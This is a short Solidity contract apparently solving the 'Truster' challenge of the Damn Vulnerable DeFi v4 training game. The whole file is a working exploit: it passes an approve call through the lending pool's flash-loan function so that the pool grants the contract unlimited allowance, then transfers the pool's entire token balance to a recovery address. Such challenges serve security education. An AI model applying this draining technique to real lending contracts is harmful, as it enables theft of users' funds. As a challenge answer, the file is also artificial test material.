// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterLenderPoolRescuer {
    constructor(TrusterLenderPool pool, address recovery) {
        DamnValuableToken token = pool.token();
        bytes memory data = abi.encodeWithSelector(
            token.approve.selector,
            address(this),
            type(uint256).max
        );

        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(
            address(pool),
            recovery,
            token.balanceOf(address(pool))
        );
    }
}
